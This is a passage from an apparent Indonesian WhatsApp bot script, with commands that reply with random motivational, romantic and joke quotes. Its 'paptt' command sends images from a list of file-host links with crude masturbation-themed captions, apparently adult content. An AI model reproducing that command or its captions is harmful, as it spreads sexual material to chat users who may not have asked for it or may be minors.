                "ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
                "ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
                "ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
                "ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
                "ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
                "ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
                "ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
                "ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
                "ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
                "ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
                "ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
                "ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
                "ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
                "ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
                "ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
                "ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
                "ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
                "ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
                "ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
                "ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
                "ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
            ]
            let motivasii = pickRandom(motivasi)
                reply(`"${motivasii}"`)
        }
        break;
        //═══════════════════════════════════//
        case 'quotesbucin': case 'quotes-bucin': case 'bucin': {
            const bucin = [
                "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
                "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
                "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
                "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
                "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
                "Pacar orang adalah jodoh kita yang tertunda.",
                "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
                "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
                "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
                "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
                "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
                "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
                "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
                "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
                "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
                "Aku ingin menjadi satu-satunya, bukan salah satunya.",
                "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
                "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
                "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
                "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
                "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
                "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
                "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
                "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
                "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
                "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
                "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
                "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
                "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
                "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
                "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
                "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
                "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
                "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
                "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
                "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
                "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
                "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
                "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
                "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
                "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
                "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
                "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
                "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
                "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
                "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
                "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
                "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
                "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
                "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
                "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
                "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
                "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
                "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
                "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
                "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
                "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
                "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
                "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
                "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
                "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
                "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
                "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
                "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
                "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
                "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
                "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
                "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
                "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
                "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
                "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
                "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
                "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
                "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
                "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
                "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
                "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
                "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
                "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
                "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
                "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
                "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
                "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
                "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
                "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
                "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
                "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
                "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
                "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
                "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
                "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
                "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
                "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
                "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
                "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
                "Saben dino kegowo ngimpi tapi ora biso nduweni.",
                "Ora ketemu koe 30 dino rasane koyo sewulan.",
                "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
                "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
                "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
                "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
                "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
                "Kanyaah akang moal luntur najan make Bayclean.",
                "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
                "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
                "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
                "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
                "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
                "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
                "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
                "Cukup jaringan aja yang hilang, kamu jangan.",
                "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
                "Musuhku adalah mereka yang ingin memilikimu juga.",
                "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
                "Jam tidurku hancur dirusak rindu.",
                "Cukup China aja yang jauh, cinta kita jangan.",
                "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
                "Cuma satu keinginanku, dicintai olehmu..",
                "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
                "Cukup antartika aja yang jauh. Antarkita jangan."
            ]
            const Cancertruth = bucin[Math.floor(Math.random() * bucin.length)]
            	  reply(`${Cancertruth}`)
        }
        break;
        //═══════════════════════════════════//
        case 'quotesbacot': case 'quotes-bacot': case 'bacot': {
            function pickRandom(list) {
                return list[Math.floor(list.length * Math.random())]
            }
        
            const bacot = [
        'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
        'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
        'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
        'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
        'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
        'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
        'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
        'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
        'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
        'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
        'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
        'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
        'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
        'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
        'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
        'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
        'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
        'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
        'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
        'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
        'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
        'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
        'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
        'Statusnya rohani, kelakuannya rohalus.',
        'Kegagalan bukan suatu keberhasilan.',
        'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
        'Aku juga pernah kaya, waktu gajian.',
        'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
        'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
        'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
        'Jangan terlalu berharap! nanti jatuhnya sakit!',
        'Ingat! Anda itu jomblo',
        'Gak tau mau ngetik apa',
            ]
            let bacotan = pickRandom(bacot)
            reply(bacotan)
        }
        break;
        //═══════════════════════════════════//
        case 'paptt': {
            if (!isOwner && !isPremium) return;
            try {
                let anunya = [
                    `\`[ # ]\` Tch.. Dasar Sangean lu om`,
                    `\`[ # ]\` Udah Gak Tahan Kah Dek?`,
                    `\`[ # ]\` Gesek Terus Sampe Lecet..`,
                    `\`[ # ]\` Coli ae terusss...`
                ]
          
                let imageList = [
                    "https://files.catbox.moe/dl7bip.jpg",
                    "https://files.catbox.moe/frbboo.jpg",
                    "https://files.catbox.moe/mr3398.jpg",
                    "https://files.catbox.moe/nz8qun.jpg",
                    "https://files.catbox.moe/gj59i5.jpg",
                    "https://files.catbox.moe/2modi2.jpg",
                    "https://files.catbox.moe/toclrf.jpg",
                    "https://files.catbox.moe/n9ytbm.jpg",
                    "https://files.catbox.moe/i007is.jpg",
                    "https://files.catbox.moe/nr4vtj.jpg",
                    "https://files.catbox.moe/tuv4td.jpg",
                    "https://files.catbox.moe/z4w6a3.jpg",
                    "https://files.catbox.moe/mj3tbj.jpg",
                    "https://files.catbox.moe/eqrve8.jpg",
                    "https://files.catbox.moe/isiy3d.jpg",
                    "https://files.catbox.moe/ya5n9v.jpg",
                    "https://files.catbox.moe/5zc7b3.jpg",
                    "https://files.catbox.moe/yiow45.jpg",
                    "https://files.catbox.moe/t038j3.jpg",
                    "https://files.catbox.moe/2emx85.jpg",
                    "https://files.catbox.moe/y5ewey.jpg",
                    "https://files.catbox.moe/wfkocz.jpg",
                    "https://files.catbox.moe/mdz1r8.jpg",
                    "https://files.catbox.moe/fgx7ac.jpg",
                    "https://files.catbox.moe/6wudxt.jpg",
                    "https://files.catbox.moe/53sai9.jpg",
                    "https://files.catbox.moe/3sorg1.jpg",
                    "https://files.catbox.moe/kqe0ud.jpg",
                    "https://files.catbox.moe/a9asrn.jpg",
                    "https://files.catbox.moe/u1gdmv.jpg",
                    "https://files.catbox.moe/tjr9c9.jpg",
                    "https://files.catbox.moe/bhlrdz.jpg",
                    "https://files.catbox.moe/9jcsot.jpg",
                    "https://files.catbox.moe/r4qpef.jpg",
                    "https://files.catbox.moe/8bkcmz.jpg",
                    "https://files.catbox.moe/k3guu8.jpg",
                    "https://files.catbox.moe/s650kz.jpg",
                    "https://files.catbox.moe/y30wcm.jpg",
                    "https://files.catbox.moe/39y6o0.jpg",
                    "https://files.catbox.moe/uk2e3v.jpg",
                    "https://files.catbox.moe/gh9nc6.jpg"
                ]
        
                let randomImagesPick = imageList[Math.floor(Math.random() * imageList.length)];
                let teksnya = anunya[Math.floor(Math.random() * anunya.length)];
            
                if (!randomImagesPick) {
                    console.error("URL gambar tidak valid");
                    return;
                }
                await sleep(2000)
                await sock.sendMessage(m.chat, {
                    image: { url: randomImagesPick },
                    caption: teksnya,
                    headerType: 4,
                    contextInfo: {
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran 
                        }, 
                        externalAdReply: {
                            title: `${global.dev} - Assistant`,
